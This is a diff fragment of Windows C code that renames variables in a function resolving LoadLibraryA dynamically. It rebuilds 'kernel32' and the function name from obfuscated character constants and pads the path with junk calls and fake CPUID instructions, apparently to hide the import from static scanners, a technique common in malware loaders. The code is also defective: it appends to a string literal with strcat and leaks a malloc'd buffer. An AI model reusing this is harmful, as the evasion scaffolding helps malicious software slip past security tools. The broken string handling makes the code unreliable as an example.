@@ -227,31 +227,33 @@ char *rot13_str(char input) {
     return str;
 } */
 
-static char LoadStr[5];
+static char loadStr[5];
 HMODULE LoadLibraryA_0(LPCSTR lpLibFileName) {
     // return LoadLibraryA(lpLibFileName);
 
     typedef HMODULE(WINAPI * LoadLibraryAFunc)(LPCSTR);
     static LoadLibraryAFunc loadLibraryA = NULL;
     if (loadLibraryA == NULL) {
-        char result[32];
-        sprintf(result, strcat(getCharMask(_6), "%d%d"), _k, _e, _r, _n, _e, _l, _3, _2);
+        char libName[32];
+        sprintf(libName, strcat(getCharMask(_6), "%d%d"), _k, _e, _r, _n, _e, _l, _3, _2);
 
-        HMODULE hKernel32 = GetModuleHandleA_Proxy(result);
+        HMODULE hKernel32 = GetModuleHandleA_Proxy(libName);
         if (hKernel32 != NULL) {
             FAKE_CPUID;
             char _L_char = _L;
             junkFunc(_0);
-            LoadStr[_4] = int_Proxy(_0);
-            LoadStr[_3] = int_Proxy(_d);
-            LoadStr[_2] = int_Proxy(_a);
-            LoadStr[_1] = int_Proxy(_o);
-            LoadStr[_0] = int_Proxy(_L);
+            loadStr[_4] = int_Proxy(_0);
+            loadStr[_3] = int_Proxy(_d);
+            loadStr[_2] = int_Proxy(_a);
+            loadStr[_1] = int_Proxy(_o);
+            loadStr[_0] = int_Proxy(_L);
 
-            char result[32];
+            char *funcName = malloc(32);
+
             FAKE_CPUID;
-            sprintf(result, strcat("Library", "%c"), _A);  // _A = LoadLibrary{'A'}
-            loadLibraryA = (LoadLibraryAFunc)GetProcAddress(hKernel32, strcat(LoadStr, result));
+
+            sprintf(funcName, strcat("Library", "%c"), _A);  // _A = LoadLibrary{'A'}
+            loadLibraryA = (LoadLibraryAFunc)GetProcAddress(hKernel32, strcat(loadStr, funcName));
         }
     }
     if (loadLibraryA != NULL) {
